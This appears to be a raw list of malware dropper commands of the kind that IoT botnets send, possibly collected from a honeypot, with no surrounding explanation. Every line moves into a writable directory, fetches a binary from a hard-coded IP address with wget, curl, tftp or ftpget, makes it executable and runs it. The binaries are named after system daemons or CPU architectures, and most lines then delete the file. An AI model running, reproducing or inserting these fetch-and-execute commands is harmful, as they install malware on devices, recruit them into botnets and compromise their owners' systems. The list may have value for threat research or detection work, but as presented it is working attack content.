cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.237.50.205/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r telnetd -g 198.167.140.187;cat telnetd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 87.121.98.32 -c get pl0xmips;cat pl0xmips >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 87.121.98.32 -c get pl0xmipsel;cat pl0xmipsel >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 87.121.98.32 -c get pl0xsh4;cat pl0xsh4 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 87.121.98.32 -c get pl0xx64;cat pl0xx64 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 87.121.98.32 -c get kittyphones;cat kittyphones >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 87.121.98.32 -c get pl0xi686;cat pl0xi686 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 87.121.98.32 -c get pl0xppc;cat pl0xppc >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 87.121.98.32 -c get ftp;cat ftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 87.121.98.32 -c get pftp;cat pftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 87.121.98.32 -c get pl0xsparc;cat pl0xsparc >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 87.121.98.32 -c get ' ';cat ' ' >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 87.121.98.32 -c get apache2;cat apache2 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 87.121.98.32 -c get telnetd;cat telnetd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.184/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.184/sshd; chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.184/openssh; chmod +x openssh; ./openssh; rm -rf openssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.184/bash; chmod +x bash; ./bash; rm -rf bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.184/tftp; chmod +x tftp; ./tftp; rm -rf tftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.184/wget; chmod +x wget; ./wget; rm -rf wget
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.184/cron; chmod +x cron; ./cron; rm -rf cron
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.184/ftp; chmod +x ftp; ./ftp; rm -rf ftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.184/pftp; chmod +x pftp; ./pftp; rm -rf pftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.184/sh; chmod +x sh; ./sh; rm -rf sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.184/' '; chmod +x ' '; ./' '; rm -rf ' '
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.184/apache2; chmod +x apache2; ./apache2; rm -rf apache2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.184/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 50.115.166.187 -c get fyfa.mips;cat fyfa.mips >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 50.115.166.187 -c get fyfa.mpsl;cat fyfa.mpsl >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 50.115.166.187 -c get fyfa.sh4;cat fyfa.sh4 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 50.115.166.187 -c get fyfa.x86;cat fyfa.x86 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 50.115.166.187 -c get fyfa.arm;cat fyfa.arm >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 50.115.166.187 -c get fyfa.i686;cat fyfa.i686 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 50.115.166.187 -c get fyfa.pcc;cat fyfa.pcc >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 50.115.166.187 -c get fyfa.i586;cat fyfa.i586 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 50.115.166.187 -c get fyfa.m68k;cat fyfa.m68k >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 50.115.166.187 -c get fyfa.spc;cat fyfa.spc >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 50.115.166.187 -c get fyfa.pcc;cat fyfa.pcc >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 107.191.48.91 -c get ntpd;cat ntpd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 107.191.48.91 -c get sshd;cat sshd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 107.191.48.91 -c get openssh;cat openssh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 107.191.48.91 -c get bash;cat bash >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 107.191.48.91 -c get tftp;cat tftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 107.191.48.91 -c get wget;cat wget >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 107.191.48.91 -c get cron;cat cron >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 107.191.48.91 -c get ftp;cat ftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 107.191.48.91 -c get pftp;cat pftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 107.191.48.91 -c get sh;cat sh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 107.191.48.91 -c get ' ';cat ' ' >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 107.191.48.91 -c get apache2;cat apache2 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 107.191.48.91 -c get telnetd;cat telnetd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ntpd -g 51.15.48.238;cat ntpd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sshd -g 51.15.48.238;cat sshd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r openssh -g 51.15.48.238;cat openssh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r bash -g 51.15.48.238;cat bash >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r tftp -g 51.15.48.238;cat tftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r wget -g 51.15.48.238;cat wget >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r cron -g 51.15.48.238;cat cron >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ftp -g 51.15.48.238;cat ftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r pftp -g 51.15.48.238;cat pftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sh -g 51.15.48.238;cat sh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r nut -g 51.15.48.238;cat nut >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r apache2 -g 51.15.48.238;cat apache2 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.208.209.208/mba; chmod +x mba; ./mba; rm -rf mba
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.208.209.208/ebs; chmod +x ebs; ./ebs; rm -rf ebs
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.208.209.208/ew; chmod +x ew; ./ew; rm -rf ew
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.208.209.208/aw; chmod +x aw; ./aw; rm -rf aw
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.208.209.208/ftr; chmod +x ftr; ./ftr; rm -rf ftr
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.208.209.208/er; chmod +x er; ./er; rm -rf er
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.208.209.208/re; chmod +x re; ./re; rm -rf re
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.208.209.208/ty; chmod +x ty; ./ty; rm -rf ty
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.208.209.208/ke; chmod +x ke; ./ke; rm -rf ke
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.208.209.208/as; chmod +x as; ./as; rm -rf as
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.208.209.208/fg; chmod +x fg; ./fg; rm -rf fg
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.208.209.208/sddf; chmod +x sddf; ./sddf; rm -rf sddf
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.208.209.208/tel; chmod +x tel; ./tel; rm -rf tel
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.238.174.124/ntpd; curl -O http://104.238.174.124/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.238.174.124/sshd; curl -O http://104.238.174.124/sshd; chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.238.174.124/openssh; curl -O http://104.238.174.124/openssh; chmod +x openssh; ./openssh; rm -rf openssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.238.174.124/bash; curl -O http://104.238.174.124/bash; chmod +x bash; ./bash; rm -rf bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.238.174.124/tftp; curl -O http://104.238.174.124/tftp; chmod +x tftp; ./tftp; rm -rf tftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.238.174.124/wget; curl -O http://104.238.174.124/wget; chmod +x wget; ./wget; rm -rf wget
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.238.174.124/cron; curl -O http://104.238.174.124/cron; chmod +x cron; ./cron; rm -rf cron
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.238.174.124/ftp; curl -O http://104.238.174.124/ftp; chmod +x ftp; ./ftp; rm -rf ftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.238.174.124/pftp; curl -O http://104.238.174.124/pftp; chmod +x pftp; ./pftp; rm -rf pftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.238.174.124/sh; curl -O http://104.238.174.124/sh; chmod +x sh; ./sh; rm -rf sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.238.174.124/nut; curl -O http://104.238.174.124/nut; chmod +x nut; ./nut; rm -rf nut
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.238.174.124/apache2; curl -O http://104.238.174.124/apache2; chmod +x apache2; ./apache2; rm -rf apache2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.238.174.124/telnetd; curl -O http://104.238.174.124/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://172.245.24.233/ntpd; curl -O http://172.245.24.233/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://172.245.24.233/sshd; curl -O http://172.245.24.233/sshd; chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://172.245.24.233/openssh; curl -O http://172.245.24.233/openssh; chmod +x openssh; ./openssh; rm -rf openssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://172.245.24.233/bash; curl -O http://172.245.24.233/bash; chmod +x bash; ./bash; rm -rf bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://172.245.24.233/tftp; curl -O http://172.245.24.233/tftp; chmod +x tftp; ./tftp; rm -rf tftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://172.245.24.233/wget; curl -O http://172.245.24.233/wget; chmod +x wget; ./wget; rm -rf wget
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://172.245.24.233/cron; curl -O http://172.245.24.233/cron; chmod +x cron; ./cron; rm -rf cron
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://172.245.24.233/ftp; curl -O http://172.245.24.233/ftp; chmod +x ftp; ./ftp; rm -rf ftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://172.245.24.233/pftp; curl -O http://172.245.24.233/pftp; chmod +x pftp; ./pftp; rm -rf pftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://172.245.24.233/sh; curl -O http://172.245.24.233/sh; chmod +x sh; ./sh; rm -rf sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://172.245.24.233/nut; curl -O http://172.245.24.233/nut; chmod +x nut; ./nut; rm -rf nut
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://172.245.24.233/apache2; curl -O http://172.245.24.233/apache2; chmod +x apache2; ./apache2; rm -rf apache2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://172.245.24.233/telnetd; curl -O http://172.245.24.233/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.29.11.171/ntpd; curl -O http://185.29.11.171/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.29.11.171/sshd; curl -O http://185.29.11.171/sshd; chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.29.11.171/openssh; curl -O http://185.29.11.171/openssh; chmod +x openssh; ./openssh; rm -rf openssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.29.11.171/bash; curl -O http://185.29.11.171/bash; chmod +x bash; ./bash; rm -rf bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.29.11.171/tftp; curl -O http://185.29.11.171/tftp; chmod +x tftp; ./tftp; rm -rf tftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.29.11.171/wget; curl -O http://185.29.11.171/wget; chmod +x wget; ./wget; rm -rf wget
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.29.11.171/cron; curl -O http://185.29.11.171/cron; chmod +x cron; ./cron; rm -rf cron
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.29.11.171/ftp; curl -O http://185.29.11.171/ftp; chmod +x ftp; ./ftp; rm -rf ftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.29.11.171/pftp; curl -O http://185.29.11.171/pftp; chmod +x pftp; ./pftp; rm -rf pftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.29.11.171/sh; curl -O http://185.29.11.171/sh; chmod +x sh; ./sh; rm -rf sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.29.11.171/nut; curl -O http://185.29.11.171/nut; chmod +x nut; ./nut; rm -rf nut
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.29.11.171/apache2; curl -O http://185.29.11.171/apache2; chmod +x apache2; ./apache2; rm -rf apache2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.29.11.171/telnetd; curl -O http://185.29.11.171/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.40.234/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.40.234/sshd; chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.40.234/openssh; chmod +x openssh; ./openssh; rm -rf openssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.40.234/bash; chmod +x bash; ./bash; rm -rf bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.40.234/tftp; chmod +x tftp; ./tftp; rm -rf tftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.40.234/wget; chmod +x wget; ./wget; rm -rf wget
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.40.234/cron; chmod +x cron; ./cron; rm -rf cron
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.40.234/ftp; chmod +x ftp; ./ftp; rm -rf ftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.40.234/pftp; chmod +x pftp; ./pftp; rm -rf pftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.40.234/sh; chmod +x sh; ./sh; rm -rf sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.40.234/[cpu]; chmod +x [cpu]; ./[cpu]; rm -rf [cpu]
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.40.234/apache2; chmod +x apache2; ./apache2; rm -rf apache2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.40.234/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.111/mba; chmod +x mba; ./mba; rm -rf mba
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.111/ebs; chmod +x ebs; ./ebs; rm -rf ebs
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.111/ew; chmod +x ew; ./ew; rm -rf ew
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.111/aw; chmod +x aw; ./aw; rm -rf aw
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.111/ftr; chmod +x ftr; ./ftr; rm -rf ftr
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.111/er; chmod +x er; ./er; rm -rf er
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.111/re; chmod +x re; ./re; rm -rf re
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.111/ty; chmod +x ty; ./ty; rm -rf ty
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.111/ke; chmod +x ke; ./ke; rm -rf ke
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.111/as; chmod +x as; ./as; rm -rf as
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.111/fg; chmod +x fg; ./fg; rm -rf fg
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.111/sddf; chmod +x sddf; ./sddf; rm -rf sddf
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.111/tel; chmod +x tel; ./tel; rm -rf tel
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.145.131.173/HIH1; chmod +x HIH1; ./HIH1; rm -rf HIH1
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 HIH1 HIH1; chmod +x HIH1 ./HIH1; rm -rf HIH1
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.145.131.173/HIH2; chmod +x HIH2; ./HIH2; rm -rf HIH2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 HIH2 HIH2; chmod +x HIH2 ./HIH2; rm -rf HIH2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.145.131.173/HIH3; chmod +x HIH3; ./HIH3; rm -rf HIH3
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 HIH3 HIH3; chmod +x HIH3 ./HIH3; rm -rf HIH3
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.145.131.173/HIH4; chmod +x HIH4; ./HIH4; rm -rf HIH4
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 HIH4 HIH4; chmod +x HIH4 ./HIH4; rm -rf HIH4
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.145.131.173/HIH5; chmod +x HIH5; ./HIH5; rm -rf HIH5
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 HIH5 HIH5; chmod +x HIH5 ./HIH5; rm -rf HIH5
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.145.131.173/HIH6; chmod +x HIH6; ./HIH6; rm -rf HIH6
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 HIH6 HIH6; chmod +x HIH6 ./HIH6; rm -rf HIH6
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.145.131.173/HIH7; chmod +x HIH7; ./HIH7; rm -rf HIH7
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 HIH7 HIH7; chmod +x HIH7 ./HIH7; rm -rf HIH7
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.145.131.173/HIH8; chmod +x HIH8; ./HIH8; rm -rf HIH8
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 HIH8 HIH8; chmod +x HIH8 ./HIH8; rm -rf HIH8
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.145.131.173/HIH9; chmod +x HIH9; ./HIH9; rm -rf HIH9
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 HIH9 HIH9; chmod +x HIH9 ./HIH9; rm -rf HIH9
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.145.131.173/HIH10; chmod +x HIH10; ./HIH10; rm -rf HIH10
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 HIH10 HIH10; chmod +x HIH10 ./HIH10; rm -rf HIH10
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.145.131.173/HIH11; chmod +x HIH11; ./HIH11; rm -rf HIH11
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 HIH11 HIH11; chmod +x HIH11 ./HIH11; rm -rf HIH11
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.145.131.173/HIH12; chmod +x HIH12; ./HIH12; rm -rf HIH12
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 HIH12 HIH12; chmod +x HIH12 ./HIH12; rm -rf HIH12
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.145.131.173/HIH13; chmod +x HIH13; ./HIH13; rm -rf HIH13
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 HIH13 HIH13; chmod +x HIH13 ./HIH13; rm -rf HIH13
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.35/Puff; curl -O http://46.166.185.35/Puff; chmod +x Puff; ./Puff; rm -rf Puff
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.35/Puff1; curl -O http://46.166.185.35/Puff1; chmod +x Puff1; ./Puff1; rm -rf Puff1
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.35/Puff2; curl -O http://46.166.185.35/Puff2; chmod +x Puff2; ./Puff2; rm -rf Puff2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.35/Puff3; curl -O http://46.166.185.35/Puff3; chmod +x Puff3; ./Puff3; rm -rf Puff3
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.35/Puff4; curl -O http://46.166.185.35/Puff4; chmod +x Puff4; ./Puff4; rm -rf Puff4
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.35/Puff5; curl -O http://46.166.185.35/Puff5; chmod +x Puff5; ./Puff5; rm -rf Puff5
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.35/Puff6; curl -O http://46.166.185.35/Puff6; chmod +x Puff6; ./Puff6; rm -rf Puff6
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.35/Puff7; curl -O http://46.166.185.35/Puff7; chmod +x Puff7; ./Puff7; rm -rf Puff7
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.35/Puff8; curl -O http://46.166.185.35/Puff8; chmod +x Puff8; ./Puff8; rm -rf Puff8
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.35/Puff9; curl -O http://46.166.185.35/Puff9; chmod +x Puff9; ./Puff9; rm -rf Puff9
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.35/Puff10; curl -O http://46.166.185.35/Puff10; chmod +x Puff10; ./Puff10; rm -rf Puff10
